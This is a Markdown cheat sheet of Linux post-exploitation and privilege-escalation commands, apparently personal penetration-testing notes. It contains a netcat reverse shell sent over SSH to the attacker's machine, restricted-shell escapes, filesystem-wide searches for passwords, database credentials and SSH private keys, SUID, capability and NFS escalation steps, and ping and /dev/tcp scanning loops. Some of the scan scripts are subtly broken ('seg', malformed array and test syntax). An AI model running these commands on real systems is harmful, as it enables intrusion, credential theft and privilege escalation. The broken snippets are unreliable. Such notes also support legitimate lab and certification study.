# Linux Enumeration 
**Summary:**

- [Linux Enumeration](#linux-enumeration)
  - [Spawn Interactive Shell and set env](#spawn-interactive-shell-and-set-env)
  - [SSH key](#ssh-key)
    - [On target](#on-target)
    - [Attacker](#attacker)
    - [Check ssh key](#check-ssh-key)
  - [Get info](#get-info)
  - [Service only available from inside](#service-only-available-from-inside)
  - [Cronjob](#cronjob)
  - [Exploit sudo](#exploit-sudo)
    - [Exploit misconfiguration](#exploit-misconfiguration)
    - [SUDO_KILLER](#sudo_killer)
  - [Sensitive files](#sensitive-files)
    - [Find password](#find-password)
    - [SSH Key](#ssh-key-1)
  - [Unmounted filesystems](#unmounted-filesystems)
  - [SUID](#suid)
    - [Writable file and nobody files](#writable-file-and-nobody-files)
    - [Writable by current user](#writable-by-current-user)
    - [world-writeable folders](#world-writeable-folders)
    - [Any script files that we can modify?](#any-script-files-that-we-can-modify)
    - [Any service running by root?](#any-service-running-by-root)
  - [Linux capability](#linux-capability)
  - [NFS priv esc](#nfs-priv-esc)
  - [World writable directories](#world-writable-directories)
  - [Id hash](#id-hash)
- [Network Scan from target](#network-scan-from-target)
  - [Network scan](#network-scan)
  - [Port Scan](#port-scan)
- [Source](#source)



## Spawn Interactive Shell and set env  

```bash
> python -c 'import pty;pty.spawn("/bin/bash");'  
> python3 -c 'import pty;pty.spawn("/bin/bash");'  

# ctrl z  
$ stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'
$ stty raw -echo; fg  [ENTER]  [ENTER]

> python -c 'import pty;pty.spawn("/bin/bash");'  
> stty rows ROWS cols COLS
> echo $TERM  
> export TERM=xterm-256color 
```

Restricted bash:
```bash
perl -e 'exec "/bin/sh";'  
/bin/sh -i  
exec "/bin/sh";  
echo os.system('/bin/bash')  
/bin/sh -i  
ssh user@$ip nc $localip 4444 -e /bin/sh  
export TERM=linux  
```

## SSH key

### On target

```sh
ssh-keygen
mkdir -m 700 ~/.ssh
touch ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

### Attacker

```
ssh -i id_rsa USERNAME@IP_ADDRESS
```

### Check ssh key 
    ssh-keyscan IP_ADDRESS

## Get info 
OS & Architecture & Kernel version:  
- `uname -a`
- `cat /proc/version`
- `cat /etc/issue`
- `lsb_release -a` 

## Service only available from inside

- `netstat -anlp`
- `netstat -ano`


## Cronjob

- `crontab -l`
- `ls -alh /etc/cron*`
- `ls -alh /var/spool/cron`
- `ls -alh /etc/at.*`
- `ls -al /etc/ | grep cron`

## Exploit sudo 

`sudo -l`
### Exploit misconfiguration
    
https://gtfobins.github.io

### SUDO_KILLER

```
git clone https://github.com/TH3xACE/SUDO_KILLER
```
Online mode:
```
./sudo_killer.sh -c -e -r report.txt -p /tmp
```
Offline mode:
```
./sudo_killer.sh -c -i /path/sk_offline.txt
```

## Sensitive files

### Find password  
```bash
grep -rnw '/' -ie 'pass' --color=always 2>/dev/null 
grep -rnw '/' -ie 'password' --color=always 2>/dev/null 
grep -rnw '/' -ie 'DB_PASS' --color=always 2>/dev/null
grep -rnw '/' -ie 'DB_PASSWORD' --color=always 2>/dev/null
grep -rnw '/' -ie 'DB_USER' --color=always 2>/dev/null
grep -rnw '/' -ie 'PRIVATE KEY' --color=always 2>/dev/null

find / -type f -regex '.*\.\(php\|log\|xml\|txt\)' -exec grep --color=auto  -i 'password' {} \; -print 2>/dev/null
```

### SSH Key

```
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
```


## Unmounted filesystems

Check any restricitions on any folders  

    mount -l        >> any no exec or no suid?  

Check any unmounted drives

    cat /etc/fstab  

## SUID

Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.  
```bash
find / -perm -1000 -type d 2>/dev/null   
```  
SGID (chmod 2000) - run as the group, not the user who started it. 
```bash
find / -perm -g=s -type f 2>/dev/null    
```
SUID (chmod 4000) - run as the owner, not the user who started it. 

    find / -perm -u=s -type f 2>/dev/null    
SGID or SUID < full search  
```bash
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null 
```
Looks in 'common' places: /bin, /sbin < quicker  

```bash
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    

-find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null  

find / perm /u=s -user "User name that you are looking for" 2>/dev/null  
```
### Writable file and nobody files  
world-writeable files 
```bash
find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   
```
Noowner files  
```bash
find /dir -xdev \( -nouser -o -nogroup \) -print 
```
### Writable by current user  
```bash
find / perm /u=w -user `whoami` 2>/dev/null  
find / -perm /u+w,g+w -f -user `whoami` 2>/dev/null  
find / -perm /u+w -user `whoami` 2>/dev/null  
```
### world-writeable folders
```bash
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null
```
### Any script files that we can modify?  
find all python file that can be write by us  
```bash
find / -writable -type f -name "*.py" 2>/dev/null  

ls -aRl / | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone  
ls -aRl / | awk '$1 ~ /^..w/' 2>/dev/null       # Owner  
ls -aRl / | awk '$1 ~ /^.....w/' 2>/dev/null    # Group  
ls -aRl / | awk '$1 ~ /w.$/' 2>/dev/null        # Other  

find / -readable -type f 2>/dev/null               # Anyone  
find / -readable -type f -maxdepth 1 2>/dev/null   # Anyone  
```
### Any service running by root?  
```bash
ps aux|grep "root"  

/usr/bin/journalctl (Which is normally not readable by a user)              << cron job?  
```

## Linux capability

```bash
find / -type f -print0 2>/dev/null | xargs -0 getcap 2>/dev/null
```
or
```bash
getcap -r /
```


## NFS priv esc

First check if the target machine has any NFS shares

    showmount -e IP_ADDRESS

If it does, then mount it to you filesystem

    mkdir /tmp/mntDrive
    mount IP_ADDRESS:/ /tmp/mntDrive/


https://medium.com/@Kan1shka9/hacklab-vulnix-walkthrough-b2b71534c0eb



## World writable directories

    /tmp
    /var/tmp
    /dev/shm
    /var/spool/vbox
    /var/spool/samba


## Id hash

    hash-identifier

# Network Scan from target 

## Network scan

```bash
for i in $(seg 1 255);do
    ping -c 1 -w 1 192.168.1.$i 1>/dev/null 2>&1
    if([$? -eq 0]); then
        echo "192.168.1.$i Online"
    fi
done
```

## Port Scan 
```bash
portList=(21 22 80 443 445 2222 8000 8080)
# for i in $(portList);do # to try 
for i in $(portList[*]);do
    echo 1 > /dev/tcp/<IP_ADDRESS>/$i 1>/dev/null 2>&1
    if([$? -eq 0]); then
        echo "<IP_ADDRESS> $i Open"
    fi
done
```



# Source 

- https://github.com/diego-treitos/linux-smart-enumeration
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
- https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html
